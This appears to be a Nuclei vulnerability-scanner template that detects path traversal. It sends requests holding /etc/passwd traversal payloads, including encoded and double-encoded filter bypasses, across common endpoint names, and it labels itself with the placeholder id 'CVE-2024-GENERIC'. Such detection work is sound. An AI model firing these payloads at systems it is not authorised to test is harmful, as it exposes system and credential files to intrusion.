id: cve-2024-generic-path-traversal
info:
  name: Generic Path Traversal Detection
  author: hybridrecon-x
  severity: high
  description: Detects common path traversal patterns
  tags: cve,lfi,path-traversal
  classification:
    cve-id: CVE-2024-GENERIC

http:
  - method: GET
    path:
      - "{{BaseURL}}/{{path}}?file=../../../etc/passwd"
      - "{{BaseURL}}/{{path}}?path=....//....//....//etc/passwd"
      - "{{BaseURL}}/{{path}}?document=..%2f..%2f..%2fetc%2fpasswd"
      - "{{BaseURL}}/{{path}}?template=..%252f..%252f..%252fetc%252fpasswd"

    payloads:
      path:
        - download
        - load
        - read
        - get
        - view
        - file
        - include
        - static
        - assets

    matchers-condition: or
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "\\[boot loader\\]"
          - "\\[extensions\\]"
